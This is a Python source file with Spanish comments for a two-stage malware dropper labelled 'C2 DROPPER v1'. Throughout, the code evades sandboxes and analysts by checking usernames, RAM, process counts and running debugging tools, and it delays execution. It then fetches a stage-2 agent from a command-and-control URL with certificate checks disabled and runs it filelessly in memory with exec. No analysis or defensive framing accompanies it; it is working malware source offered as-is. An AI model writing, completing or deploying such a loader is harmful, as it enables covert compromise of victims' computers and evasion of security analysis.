"""
╔══════════════════════════════════════════════════════════════╗
║     C2 DROPPER v1 - STAGE 1 LOADER (MINIMAL 8KB)            ║
╚══════════════════════════════════════════════════════════════╝
Dropper de 2 etapas:
  1. Anti-sandbox + Anti-VM checks
  2. Descarga y ejecuta Stage 2 (agent_v2) en RAM sin tocar disco
"""
import urllib.request
import ssl
import sys
import os
import platform
import time
import subprocess

# Reemplazado por el builder al compilar
C2_URL = "https://127.0.0.1:5000"

ssl_context = ssl._create_unverified_context()
UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'

def _is_safe() -> bool:
    """Anti-sandbox: Verifica que el entorno sea real antes de activarse."""
    if platform.system() != 'Windows':
        return True

    # Check 1: Nombres de usuario de sandboxes conocidos
    username = os.environ.get('USERNAME', '').lower()
    bad_users = {'sandbox', 'maltest', 'virus', 'sample', 'test',
                 'analyst', 'cuckoo', 'malware', 'john', 'user', 'vmuser'}
    if username in bad_users:
        return False

    # Check 2: RAM mínima (< 1.5GB = sandbox/VM ligera)
    try:
        import ctypes
        class _MEMSTAT(ctypes.Structure):
            _fields_ = [("l", ctypes.c_ulong), ("_", ctypes.c_ulong),
                        ("t", ctypes.c_ulonglong), ("a", ctypes.c_ulonglong)]
        ms = _MEMSTAT()
        ms.l = ctypes.sizeof(ms)
        ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(ms))
        if ms.t < int(1.5 * 1024 ** 3):
            return False
    except Exception:
        pass

    # Check 3: Número mínimo de procesos activos (< 25 = sandbox)
    try:
        r = subprocess.run(['tasklist'], capture_output=True, text=True, timeout=5)
        if r.stdout.count('\n') < 25:
            return False
    except Exception:
        pass

    # Check 4: Verificar que no hay herramientas de análisis corriendo
    bad_procs = ['wireshark', 'procmon', 'ollydbg', 'ida', 'x64dbg',
                 'procexp', 'fiddler', 'charles', 'burp']
    try:
        r = subprocess.run(['tasklist'], capture_output=True, text=True, timeout=5)
        tasks_lower = r.stdout.lower()
        if any(p in tasks_lower for p in bad_procs):
            return False
    except Exception:
        pass

    return True


def _fetch_stage2() -> str | None:
    """Descarga el agente completo desde el servidor C2 (en memoria, sin disco)."""
    try:
        req = urllib.request.Request(
            f"{C2_URL}/stage2",
            headers={'User-Agent': UA}
        )
        with urllib.request.urlopen(req, context=ssl_context, timeout=15) as r:
            return r.read().decode('utf-8')
    except Exception:
        return None


if __name__ == '__main__':
    # Evadir sandbox con timeout corto (< 5 segundos)
    time.sleep(6)

    if not _is_safe():
        sys.exit(0)

    stage2 = _fetch_stage2()
    if stage2:
        exec(compile(stage2, '<stage2>', 'exec'))
    # Si falla, morir silenciosamente
    sys.exit(0)
